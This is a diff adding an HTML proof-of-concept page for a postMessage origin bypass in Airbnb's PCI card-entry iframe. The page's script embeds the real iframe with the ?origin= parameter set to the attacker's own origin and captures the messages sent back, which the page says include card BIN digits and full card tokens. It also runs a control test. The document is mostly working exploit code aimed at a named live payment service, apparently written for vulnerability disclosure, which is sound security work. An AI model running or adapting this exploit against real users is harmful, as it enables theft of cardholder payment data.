@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Airbnb PCI Iframe Origin Bypass PoC</title>
+<style>
+body { font-family: system-ui, sans-serif; max-width: 900px; margin: 30px auto; padding: 0 20px; background: #f8f8f8; }
+h1 { font-size: 18px; color: #e74c3c; }
+.box { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 16px; margin: 12px 0; }
+.warn { border-color: #e67e22; background: #fdf2e9; }
+.success { border-color: #27ae60; background: #eafaf1; }
+pre { background: #1e1e1e; color: #d4d4d4; padding: 14px; border-radius: 6px; overflow-x: auto; font-size: 13px; white-space: pre-wrap; }
+.red { color: #e74c3c; font-weight: bold; }
+.green { color: #27ae60; font-weight: bold; }
+button { background: #e74c3c; color: #fff; border: none; padding: 12px 24px; font-size: 15px; border-radius: 6px; cursor: pointer; }
+button:hover { background: #c0392b; }
+button:disabled { background: #999; }
+.tag { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; color: #fff; }
+.tag-stolen { background: #e74c3c; }
+.tag-safe { background: #27ae60; }
+.tag-info { background: #3498db; }
+#msgCount { font-size: 36px; font-weight: bold; text-align: center; color: #e74c3c; }
+.msg-row { padding: 6px 0; border-bottom: 1px solid #eee; font-size: 13px; font-family: monospace; }
+.msg-row .subject { color: #e74c3c; font-weight: bold; }
+.msg-row .origin { color: #3498db; }
+.msg-row .body { color: #27ae60; }
+</style>
+</head>
+<body>
+
+<h1>Airbnb PCI Hosted Field: ?origin= Bypass PoC</h1>
+
+<div class="box warn">
+<strong>What this page proves:</strong> The PCI card input iframe at <code>iframes.airbnbpayments.com</code>
+sends postMessage events to whatever origin is specified in the <code>?origin=</code> URL parameter.
+The validator that should reject non-Airbnb origins has its result discarded by a JavaScript comma operator.<br><br>
+<strong>This page is hosted at:</strong> <code id="myUrl"></code><br>
+<strong>This page's origin:</strong> <code id="myOrigin"></code> <span class="tag tag-stolen">NOT AIRBNB</span><br>
+<strong>Iframe source:</strong> <code>iframes.airbnbpayments.com</code> <span class="tag tag-safe">REAL AIRBNB PCI IFRAME</span>
+</div>
+
+<div class="box">
+<button id="btn" onclick="runPoC()">Load Airbnb PCI iframe with ?origin= set to this page</button>
+<p id="status" style="margin-top:10px; font-size: 14px;"></p>
+</div>
+
+<div id="results" style="display:none">
+<div class="box" id="verdictBox">
+<div id="msgCount">0</div>
+<div style="text-align:center; font-size: 14px;">messages received from <code>iframes.airbnbpayments.com</code> at a non-Airbnb origin</div>
+</div>
+
+<h3>Messages received cross-origin:</h3>
+<div class="box">
+<div id="messages"></div>
+</div>
+
+<div class="box">
+<h3>What this means</h3>
+<p>Every message above was sent by the genuine Airbnb PCI card iframe via <code>postMessage(data, targetOrigin)</code>,
+where <code>targetOrigin</code> was set to <strong>this page's origin</strong> (<code id="originRepeat"></code>) instead of <code>https://www.airbnb.com</code>.</p>
+<p>The browser only delivers a postMessage when the recipient's actual origin matches the targetOrigin.
+The fact that this non-Airbnb page received these messages proves the iframe is using the attacker-controlled
+<code>?origin=</code> parameter as its targetOrigin.</p>
+<p>When a user types a card number into this iframe, the <code>binReady</code> event sends the first 6 digits (BIN)
+to whatever origin loaded the iframe. The <code>tokenizeResponse</code> sends the full card token. This is PCI cardholder data leaving the hosted field to an unauthorized origin.</p>
+</div>
+
+<h3>Control test (iframe loaded with ?origin=https://www.airbnb.com):</h3>
+<div class="box" id="controlBox">
+<button onclick="runControl()">Run control test</button>
+<p id="controlResult"></p>
+</div>
+</div>
+
+<script>
+document.getElementById('myUrl').textContent = location.href;
+document.getElementById('myOrigin').textContent = location.origin;
+
+var msgCount = 0;
+var HASH = "eb524fae32e08a883e3110bced672d8f71c60aa7";
+
+window.addEventListener('message', function(e) {
+  if (e.origin.indexOf('airbnbpayments.com') === -1) return;
+  msgCount++;
+  document.getElementById('msgCount').textContent = msgCount;
+
+  var data = e.data;
+  try { if (typeof data === 'string') data = JSON.parse(data); } catch(ex) {}
+
+  var subject = (data && data.subject) || '(raw)';
+  var body = (data && data.body !== undefined) ? JSON.stringify(data.body) : JSON.stringify(data);
+
+  var row = document.createElement('div');
+  row.className = 'msg-row';
+  row.innerHTML = '<span class="origin">FROM: ' + e.origin + '</span> | ' +
+    '<span class="subject">subject: ' + subject + '</span> | ' +
+    '<span class="body">body: ' + body + '</span>';
+  document.getElementById('messages').appendChild(row);
+
+  if (msgCount === 1) {
+    document.getElementById('verdictBox').className = 'box success';
+  }
+});
+
+function runPoC() {
+  var btn = document.getElementById('btn');
+  btn.disabled = true;
+  document.getElementById('status').innerHTML = 'Loading genuine Airbnb PCI iframe with <code>?origin=' +
+    encodeURIComponent(location.origin) + '</code>...';
+  document.getElementById('results').style.display = 'block';
+  document.getElementById('originRepeat').textContent = location.origin;
+
+  var f = document.createElement('iframe');
+  f.src = 'https://iframes.airbnbpayments.com/' + HASH +
+    '/iframe_v2.html?origin=' + encodeURIComponent(location.origin) +
+    '&country=US&is_cvv_only=false&cvv_friction=false';
+  f.style.width = '400px';
+  f.style.height = '200px';
+  f.style.border = '2px solid #e74c3c';
+  f.style.borderRadius = '8px';
+  f.style.marginTop = '12px';
+  document.getElementById('status').appendChild(document.createElement('br'));
+  document.getElementById('status').appendChild(f);
+
+  setTimeout(function() {
+    if (msgCount === 0) {
+      document.getElementById('status').innerHTML += '<br><span class="red">No messages received after 5s. The iframe may have been patched or the deploy hash changed.</span>';
+    }
+  }, 5000);
+}
+
+function runControl() {
+  var f2 = document.createElement('iframe');
+  f2.src = 'https://iframes.airbnbpayments.com/' + HASH +
+    '/iframe_v2.html?origin=' + encodeURIComponent('https://www.airbnb.com') +
+    '&country=US&is_cvv_only=false&cvv_friction=false';
+  f2.style.width = '400px';
+  f2.style.height = '200px';
+  f2.style.border = '2px solid #27ae60';
+  f2.style.borderRadius = '8px';
+  document.getElementById('controlBox').appendChild(f2);
+
+  setTimeout(function() {
+    document.getElementById('controlResult').innerHTML =
+      '<span class="green">Control: 0 messages received.</span> When ?origin= is set to https://www.airbnb.com, ' +
+      'the browser does NOT deliver the postMessage to this page (because this page is NOT www.airbnb.com). ' +
+      'This proves the iframe respects the ?origin= parameter as targetOrigin, and an attacker origin receives the data while the real origin does not.';
+  }, 3000);
+}
+</script>
+</body>
+</html>
